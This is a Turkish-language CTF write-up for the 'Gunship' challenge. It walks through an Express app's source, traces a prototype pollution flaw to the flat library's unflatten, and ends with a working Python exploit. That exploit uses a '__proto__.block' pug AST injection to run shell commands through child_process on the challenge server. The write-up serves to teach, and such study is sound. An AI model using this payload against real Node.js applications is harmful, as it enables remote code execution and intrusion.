---
{"dg-publish":true,"permalink":"/ctf/gunship-challenges/"}
---

Bu zorluk, RCE ile sonuçlanan prototype pollution yoluyla javascript template engine'lere AST enjeksiyonunu içeriyordu


### Gerekli Beceriler
* mProxy araçları, örneğin Burp Suite / OWASP ZAP aracılığıyla HTTP isteklerini engelleme.
* Javascript ve Node.js hakkında temel bilgi.
* Javascript prototip kirliliği hakkında temel anlayış.


### Öğrenilen Beceriler
* RCE'ye prototype pollution


### Uygulamaya genel bakış:

Web sitesine girildiğinde bir İngiliz synthwave grubuna saygı sayfası görülüyor.

![Pasted image 20250129191220.png](/img/user/resimler/Pasted%20image%2020250129191220.png)

Kullanıcı favori sanatçısının adını girebilir:

![Pasted image 20250129191428.png](/img/user/resimler/Pasted%20image%2020250129191428.png)

Uygulamanın sahip olduğu tüm kullanıcı fonksiyonelliği budur.


### Solution

#### Kaynak Kod İncelemesi

`routes/index.js` dosyasında sadece iki rota vardır, bunlardan ilki HTML döndüren varsayılan rotadır

```
const path              = require('path');
const express           = require('express');
const pug        		= require('pug');
const { unflatten }     = require('flat');
const router            = express.Router();

router.get('/', (req, res) => {
    return res.sendFile(path.resolve('views/index.html'));
});

router.post('/api/submit', (req, res) => {
    const { artist } = unflatten(req.body);

	if (artist.name.includes('Haigh') || artist.name.includes('Westaway') || artist.name.includes('Gingell')) {
		return res.json({
			'response': pug.compile('span Hello #{user}, thank you for letting us know!')({ user: 'guest' })
		});
	} else {
		return res.json({
			'response': 'Please provide us with the full name of an existing member.'
		});
	}
});

module.exports = router;
```

---

**`const`**, JavaScript'te **sabit (constant)** bir değişken tanımlamak için kullanılır.

**`require`**, Node.js'de bir modül yüklemek için kullanılan bir fonksiyondur. Node.js, modüler bir yapıya sahiptir ve `require` sayesinde başka dosyaları veya Node.js modüllerini projeye dahil edebiliriz.

```
const path = require('path');
```

`path` modülü, dosya ve dizin yollarını çalıştırırken yardımcı olur. Örneğin, dosya yollarını birleştirme veya çözme işlemleri için kullanılır.

```
const express = require('express');
```

`express`, Node.js için hafif ve esnek bir web uygulama framework'üdür. Web sunucusu oluşturmak için kullanılır.

```
const pug = require('pug');
```

`pug`, HTML template'leri oluşturmak için kullanılan bir template motorudur. Dinamik HTML çıktıları oluşturmak için kullanılır.

```
const { unflatten } = require('flat');
```

`flat` kütüphanesinden `unflatten` fonksiyonu alınıyor. Bu fonksiyon, düzleştirilmiş (flat) bir JSON objesini iç içe geçmiş bir yapıya dönüştürür.

```
const router = express.Router();
```

`router`, Express.js'in bir alt uygulama oluşturmasını sağlar. Bu sayede farklı yollar (routes) ve işlemleri gruplandırabiliriz.

```
router.get('/', (req, res) => {
    return res.sendFile(path.resolve('views/index.html'));
});
```

- **`router.get`**: Sunucu, `/` yoluna gelen bir GET isteğini işler.
- **`res.sendFile`**: `index.html` dosyasını client'e gönderir.
- **`path.resolve('views/index.html')`**: `views` klasöründeki `index.html` dosyasının tam yolunu oluşturur.

```
router.post('/api/submit', (req, res) => {
    const { artist } = unflatten(req.body);
```

- **`router.post`**: `/api/submit` yoluna gelen POST isteklerini işler.
- **`req.body`**: Request body'sinden gelen veriyi alır.
- **`unflatten`**: Düz JSON yapısını iç içe bir objeye dönüştürür.
- **`artist`**: `req.body` içindeki `artist` anahtarını alır (örneğin: `artist.name`).

```
if (artist.name.includes('Haigh') || artist.name.includes('Westaway') || artist.name.includes('Gingell')) {
```

`artist.name` içinde belirli bir ismin olup olmadığı kontrol edilir:

- Eğer `artist.name` şu kelimeleri içeriyorsa:
    - `"Haigh"`
    - `"Westaway"`
    - `"Gingell"`

```
        return res.json({
            'response': pug.compile('span Hello #{user}, thank you for letting us know!')({ user: 'guest' })
        });
```

- **`res.json`**: Client'e JSON formatında bir yanıt gönderir.
- **`pug.compile`**: Bir Pug temlpate'ini HTML'e dönüştürür.
    - `span Hello #{user}, thank you for letting us know!`: HTML'de bir `<span>` etiketi oluşturur ve kullanıcı adı olarak `guest` ekler.

```
    } else {
        return res.json({
            'response': 'Please provide us with the full name of an existing member.'
        });
    }
```

Eğer isimler kontrolünden geçemezse:

- Client'e bir mesaj gönderilir: "Please provide us with the full name of an existing member."

```
module.exports = router;
```

* Bu kod bloğu, diğer dosyalarda kullanılmak üzere `router` objesini dışa aktarır. Örneğin, bir ana sunucu dosyasında (`app.js`) bu router kullanılabilir.


### Özet:

Bu kod:

1. Ana sayfa isteği için `index.html` dosyasını gönderir.
2. Bir formdan gelen isim verisini kontrol eder.
3. Verilere göre teşekkür mesajı veya hata mesajı döndürür.


----

### İkinci Route’un Açıklaması:

1. **Route İşleme:**
    
    - Bu route, **HTTP POST** isteklerini **/api/submit** endpoint’i için işlemek üzere ayarlanmıştır.

2. **İstek İşleme:**
    
    - `unflatten` fonksiyonunu (verileri düzleştirilmiş bir yapıdan çıkaran bir yardımcı fonksiyon olduğunu varsayıyoruz) kullanarak, gelen isteğin body'sinden **artist** objesini çıkarır.
    - Özellikle **artist** objesinin **name** (isim) özelliğinin, belirli isimleri (`Haigh`, `Westaway` veya `Gingell`) içerip içermediğini kontrol eder.

3. **Koşullu Yanıt:**
    
    - Eğer **name** özelliği belirtilen isimlerden birini içeriyorsa:
        - Bir **JSON objesi** ile yanıt döner.
        - Yanıt, `pug.compile` fonksiyonuyla derlenmiş bir Pug şablonundan oluşturulmuş bir mesaj içerir. Bu mesaj, şu şekilde görünür: **Hello #{user}, thank you for letting us know!**
            - Burada **#{user}**, `guest` değeri ile değiştirilir.
    - Eğer **name** özelliği belirtilen isimleri içermiyorsa:
        - **JSON objesi** olarak farklı bir yanıt döner: **Please provide us with the full name of an existing member.**

4. **JSON Yanıt:**
    
    - Response, client'e bir **JSON** objesi olarak gönderilir.
    - Bu JSON, uygun mesajı içeren bir `response` özelliği taşır.

**Not:** Kodun kendisi düzgün görünüyor, ancak `flat` kütüphanesinden alınan `unflatten` fonksiyonu kullanılıyor. Bu nedenle `package.json` dosyasını kontrol etmek gerekebilir.

Kodun kendisi iyi görünüyor, ancak flat kütüphanesinden unflatten kullanıyor; package.json'a bir göz atarak

```
{
	"name": "gunship",
	"version": "1.0.0",
	"description": "",
	"main": "index.js",
	"scripts": {
		"start": "node index.js",
		"dev": "nodemon .",
		"test": "echo \"Error: no test specified\" && exit 1"
	},
	"keywords": [],
	"authors": [
		"makelaris",
		"makelarisjr"
	],
	"dependencies": {
		"express": "^4.17.1",
		"flat": "5.0.0",
		"pug": "^3.0.0"
	}
}
```

Uygulama, **unflatten** metodundaki bir zafiyete karşı savunmasız olan, belirli bir sürümdeki **flat** kütüphanesini kullanıyor ve bu durum **prototype pollution** (prototip kirliliği) saldırılarına açık hale getiriyor.

Uygulama, **prototype pollution** saldırılarına karşı savunmasız ve yanıtları oluşturmak için **pug** template motorunu kullanıyor. Bu nedenle, **pug template injection** üzerinden [[Bağlantılar/AST Injection\|AST Injection]] gerçekleştirerek **RCE** (Remote Code Execution - Uzaktan Kod Çalıştırma) elde edebiliriz.

![Pasted image 20250129202818.png](/img/user/resimler/Pasted%20image%2020250129202818.png)

JS uygulamasında Prototype pollution zafiyeti varsa, Parser veya Compiler işlemi sırasında fonksiyona herhangi bir AST eklenebilir. Burada, henüz lexer veya parser tarafından doğrulanmamış olan girdiyi düzgün bir şekilde filtrelemeden (düzgün bir şekilde filtrelenmemiş) AST ekleyebilirsiniz. Ardından, derleyiciye beklenmedik bir girdi verebiliriz.

![Pasted image 20250129202906.png](/img/user/resimler/Pasted%20image%2020250129202906.png)

Pug yukarıdaki grafikte gösterildiği gibi çalışır. Handlebar'lardan farklı olarak, her proses ayrı bir modüle ayrılmıştır. pug-parser tarafından üretilen AST, pug-code-gen'e aktarılır ve bir fonksiyon haline getirilir. Ve son olarak, çalıştırılacaktır.


### Exploit

Senaryomuzu exploit etmek için aşağıdaki exploit 'i oluşturabiliriz:

```
import requests
TARGET_URL = 'http://94.237.50.242:30751'
r = requests.post(TARGET_URL+'/api/submit', json = {
    "artist.name": "Gingell",
    "__proto__.block": {
        "type": "Text",
        "line": "console.log(process.mainModule.require('child_process').execSync('whoami > /app/static/pwned').toString())"
    }
})
print(requests.get(TARGET_URL+'/static/pwned').text)

```

![Pasted image 20250129204016.png](/img/user/resimler/Pasted%20image%2020250129204016.png)

![Pasted image 20250129203939.png](/img/user/resimler/Pasted%20image%2020250129203939.png)

![Pasted image 20250129203946.png](/img/user/resimler/Pasted%20image%2020250129203946.png)

